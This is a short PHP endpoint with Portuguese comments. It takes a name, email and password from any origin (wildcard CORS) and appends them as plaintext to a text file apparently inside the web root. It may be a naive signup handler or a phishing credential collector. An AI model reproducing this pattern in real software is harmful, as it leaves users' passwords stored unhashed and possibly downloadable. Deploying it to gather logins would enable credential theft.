<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: *");
header("Access-Control-Allow-Headers: *");

$nome = $_POST['nome'];
$email = $_POST['email'];
$password = $_POST['password'];

// Formate os dados que você deseja salvar no arquivo
$dados = $nome . "|" . $email . "|" . $password ."\n";

// Especifique o caminho completo para o arquivo de bloco de notas
$caminhoArquivo = "./dados.txt";

// Abra o arquivo em modo de escrita
$arquivo = fopen($caminhoArquivo, "a");

// Verifique se o arquivo foi aberto com sucesso
if ($arquivo) {
    // Escreva os dados no arquivo
    fwrite($arquivo, $dados);

    // Feche o arquivo
    fclose($arquivo);

    header('Content-Type: application/json');

    // Retorne uma resposta de sucesso
    echo json_encode(['success' => true]);
} else {
    header('Content-Type: application/json');
    // Retorne uma resposta de erro, caso o arquivo não possa ser aberto
    echo json_encode(['success' => false, 'error' => 'Não foi possível abrir o arquivo']);
}
?>
